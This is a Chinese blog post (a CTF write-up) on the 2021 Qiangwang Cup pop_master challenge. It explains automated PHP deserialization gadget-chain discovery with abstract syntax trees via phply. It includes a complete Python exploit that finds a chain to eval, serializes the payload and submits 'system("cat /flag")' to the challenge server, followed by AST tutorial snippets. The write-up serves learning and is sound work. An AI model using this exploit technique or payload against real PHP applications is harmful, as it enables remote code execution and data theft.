@@ -1,0 +1,848 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Greed">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="21年强网杯 pop_master这道题花了我三四天的时间(当然主要是忙里抽闲)才勉强算得上理解，作者主要想提供一个思路：通过抽象语法树来进行自动化代码审计，然而据说当时的题解五花八门，基本没有按作者预期的题解，这也导致相关的文章比较难找。。。 题目网站直接给出源码，一眼pop链(当然题目也告诉了) 12345678&lt;?phpinclude &quot;class.php&quot;;&#x2F;&#x2F;c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="21年强网杯pop_master">
+<meta property="og:url" content="https://just1greed.github.io/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/index.html">
+<meta property="og:site_name" content="Welcome to greed&#39; blog">
+<meta property="og:description" content="21年强网杯 pop_master这道题花了我三四天的时间(当然主要是忙里抽闲)才勉强算得上理解，作者主要想提供一个思路：通过抽象语法树来进行自动化代码审计，然而据说当时的题解五花八门，基本没有按作者预期的题解，这也导致相关的文章比较难找。。。 题目网站直接给出源码，一眼pop链(当然题目也告诉了) 12345678&lt;?phpinclude &quot;class.php&quot;;&#x2F;&#x2F;c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214193835886.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214200730966.png">
+<meta property="article:published_time" content="2023-12-14T11:33:17.000Z">
+<meta property="article:modified_time" content="2023-12-15T03:12:32.497Z">
+<meta property="article:author" content="Greed">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://just1greed.github.io/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214193835886.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>21年强网杯pop_master - Welcome to greed&#39; blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"just1greed.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>greed&#39; blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="21年强网杯pop_master"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-14 19:33" pubdate>
+          2023年12月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          79 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">21年强网杯pop_master</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：几秒前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="21年强网杯-pop-master"><a href="#21年强网杯-pop-master" class="headerlink" title="21年强网杯 pop_master"></a>21年强网杯 pop_master</h3><p>这道题花了我三四天的时间(当然主要是忙里抽闲)才勉强算得上理解，作者主要想提供一个思路：通过抽象语法树来进行自动化代码审计，然而据说当时的题解五花八门，基本没有按作者预期的题解，这也导致相关的文章比较难找。。。</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>网站直接给出源码，一眼pop链(当然题目也告诉了)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-comment">//class.php.txt</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$class</span>-&gt;<span class="hljs-title function_ invoke__">w78yAw</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
+
+<p>结构很简单，解题思路也很清晰，找到一条调用链实现任意代码执行即可，bbbbbbbbut！</p>
+<p>按照注释下载源码后，好家伙，17万行代码，一万个类。。。</p>
+<p>很显然肉眼审计不太现实，只能搓个脚本辅助找到一条可用链，然后我就去搜了作者的官方题解</p>
+<p>[强网杯<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244153">pop_master]与[陀那多]赛题的出题记录</a> </p>
+<p>嘿，您猜怎么着？作者直接把自己的一个项目改过来当解题脚本了，这也就算了，关键这脚本…加起来有一千多行，就两天时间打个比赛，还要我用不熟练的php手搓一个千行脚本吗？？？  </p>
+<p>看的心累，无奈，开始求援，在组内发了自己的问题和求助</p>
+<p><img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214193835886.png" srcset="/img/loading.gif" lazyload alt="image-20231214193835886"></p>
+<p>很好，得到了老学长的帮助，老学长说自己做过这道题，然后甩了个链接 <a target="_blank" rel="noopener" href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">https://blog.frankli.site/2021/06/15/Misc/libphpserialize/</a></p>
+<p>我一看，霍，一百行，还是py写的，我可太开心了，老学长不愧是老学长，直接给我省了一大堆麻烦，然后开始啃学长的exp。。。</p>
+<p>没！有！注！释！</p>
+<p>估计是打比赛或者临时做题搓的脚本，或者是觉得太简单懒得写注释，总之我要生啃了还好学长的代码格式非常规范，函数命名也都是相关名词或者缩写，简单的让gpt4帮我梳理了下逻辑就差不多理解了，只能说很强，放个学长的exp膜拜一下</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phpserialize <span class="hljs-keyword">import</span> serialize<br><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> session<br><br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>ses = session()<br>classes = &#123;&#125;<br>func2class = &#123;&#125;<br>parser = make_parser()<br>good_paths = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment<br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:<br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:<br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == If<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:<br>        <span class="hljs-comment"># debug</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:<br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    ctx.param = method.params[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:<br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br><br><br>good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prop_call</span>(<span class="hljs-params">parent, attr, cls</span>):<br>    <span class="hljs-built_in">setattr</span>(parent, attr, <span class="hljs-built_in">type</span>(cls, (<span class="hljs-built_in">object</span>,), &#123;&#125;)())<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(parent, attr)<br><br><br>root = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;dLEWX3&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>node = root<br>path = good_paths[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>    node = prop_call(node, path[i][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>].name)<br><span class="hljs-built_in">print</span>(serialize(root))<br><br><span class="hljs-built_in">print</span>(ses.get(<span class="hljs-string">&#x27;http://my_instance.cloudeci1.ichunqiu.com/&#x27;</span>, params=&#123;<br>    <span class="hljs-string">&#x27;pop&#x27;</span>: serialize(root),<br>    <span class="hljs-string">&#x27;argv&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;); //&#x27;</span>,<br>&#125;).text)<br></code></pre></td></tr></table></figure>
+
+<p> 学长用了python的 <code>libphpserialize</code> 库，整体思想和作者差不多，先将一万个类转为抽象代码树，然后遍历节点分别判断 <strong>变量赋值，if语句，for语句</strong> 是否会对链的传导产生影响，也就是能否 ‘<strong>消毒</strong>‘，然后通过类似压栈出栈的方式来依次遍历可行路线，最终得到完整链路，并且！还做了自动化生成php序列化payload和自动提交，可以说考虑的及其全面了，接下来我斗胆尝试对学长的代码进行一波分析和学习，并对涉及的概念做个梳理。 </p>
+<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>首先是相关概念</p>
+<h5 id="抽象语法树-AST"><a href="#抽象语法树-AST" class="headerlink" title="抽象语法树(AST)"></a>抽象语法树(AST)</h5><p>抽象语法树（abstract syntax tree，AST） 是源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码中的一种结构，这所以说是抽象的，是因为抽象语法树并不会表示出真实语法出现的每一个细节，比如说，嵌套括号被隐含在树的结构中，并没有以节点的形式呈现。 抽象语法树并不依赖于源语言的语法，也就是说语法分析阶段所采用的上下文无文文法，因为在写文法时，经常会对文法进行等价的转换（消除左递归，回溯，二义性等），这样会给文法分析引入一些多余的成分，对后续阶段造成不利影响，甚至会使合个阶段变得混乱。因些，很多编译器经常要独立地构造语法分析树，为前端，后端建立一个清晰的接口。 抽象语法树在很多领域有广泛的应用，比如浏览器，智能编辑器，编译器。</p>
+<p>简单来说，把一段代码变成树状结构，类似于 1+2*3 变成这个样子</p>
+<img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214200730966.png" srcset="/img/loading.gif" lazyload alt="image-20231214200730966" style="zoom:50%;">
+
+<h5 id="phply"><a href="#phply" class="headerlink" title="phply"></a>phply</h5><p>phply是一个运行在python上的php源的词法分析器和解析器，可以把php代码解析成类似上图那样的结构，并按照一定的语法进行查找和分析。来段简单的示例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>lexer = phplex.lexer.clone()<br>parser = make_parser()<br>ast = parser.parse(php_code, lexer=lexer)<br><span class="hljs-built_in">print</span>(ast)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-comment"># [Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False)]</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到，<code>variable</code>变量1,2,3 经过 <code>binaryOp</code>二元操作符 <code>*</code> 和 <code>+</code> 处理后 ，<code>assignment</code> 赋值给 <code>variable</code> 变量 <code>$a</code> 。</p>
+<p>再来个稍微复杂的语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">if(2&gt;1)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [If(BinaryOp(&#x27;&gt;&#x27;, 2, 1), Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]), [], None)]</span><br></code></pre></td></tr></table></figure>
+
+<p>每个 <code>[]</code> 分隔开一个代码块，for 也差不多</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">for($i = 0; $i &lt; 13; $i ++)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [For([Assignment(Variable(&#x27;$i&#x27;), 0, False)], [BinaryOp(&#x27;&lt;&#x27;, Variable(&#x27;$i&#x27;), 13)], [PostIncDecOp(&#x27;++&#x27;, Variable(&#x27;$i&#x27;))], Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]))]</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h5><p>好了，剩下的通过代码来学习吧</p>
